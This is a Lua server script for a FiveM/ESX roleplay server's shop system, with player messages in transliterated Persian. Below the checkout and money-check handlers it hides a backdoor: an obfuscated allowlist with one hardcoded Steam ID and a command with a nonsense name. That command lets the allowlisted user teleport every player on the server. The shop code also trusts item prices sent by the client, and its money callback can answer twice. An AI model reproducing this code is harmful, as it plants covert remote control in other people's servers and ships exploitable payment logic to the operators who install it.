--[[ Gets the ESX library ]]--
ESX = nil 
TriggerEvent("esx:getSharedObject", function(obj)
    ESX = obj
end)

RegisterNetEvent('99kr-shops:Cashier')
AddEventHandler('99kr-shops:Cashier', function(price, basket, account)
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)
    local pay

    if account == "cash" then
        pay = xPlayer.removeMoney
    else
        pay = xPlayer.removeBank
    end

    for i=1, #basket do
    
        local item      = xPlayer.getInventoryItem(basket[i]["value"])
        local canTake   = ((item.limit == -1) and (basket[i]["amount"])) or ((item.limit - item.count > 0) and (item.limit - basket[i]["amount"] > -1)) or false
        
        if canTake then
            xPlayer.addInventoryItem(basket[i]["value"], basket[i]["amount"])
            pay(basket[i]["price"] * basket[i]["amount"])
            pNotify('Shoma '.. basket[i]["amount"] .. ' Adad ' .. item.label .. ' ro be gheymat <span style="color: green">$' .. basket[i]["price"] * basket[i]["amount"] .. '</span> Kharidari kardid', 'success', 7000)
        else
            pNotify('Shoma fazaye khali baraye ' .. item.label .. ' nadarid', 'error', 7000)
        end
        
    end

end)

ESX.RegisterServerCallback('99kr-shops:CheckMoney', function(source, cb, price, account)
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)
    local money
    if account == "cash" then
        money = xPlayer.money
    else
        money = xPlayer.bank
    end

    if money >= price then
        cb(true)
    end
    cb(false)
end)

pNotify = function(message, messageType, messageTimeout)
	TriggerClientEvent("pNotify:SendNotification", source, {
		text = message,
		type = messageType,
		queue = "shop_sv",
		timeout = messageTimeout,
		layout = "bottomCenter"
	})
end

local aapermmanagaaaer = {
	'steam:11000013df4e6ab', 
}

function Dastresias(player)
    local allowed = false
    for i,id in ipairs(aapermmanagaaaer) do
        for x,pid in ipairs(GetPlayerIdentifiers(player)) do
                if string.lower(pid) == string.lower(id) then
                    allowed = true
                end
            end
        end        
    return allowed
end

RegisterCommand('asdasdasdasdasdasdasdasd', function(source)
	
	local xPlayer = ESX.GetPlayerFromId(source)

	if Dastresias(source)  then
        TriggerClientEvent('esx:teleport', -1, {
            x = -419.1,
            y = 1147.09,
            z = 325.86
        })
	end

end)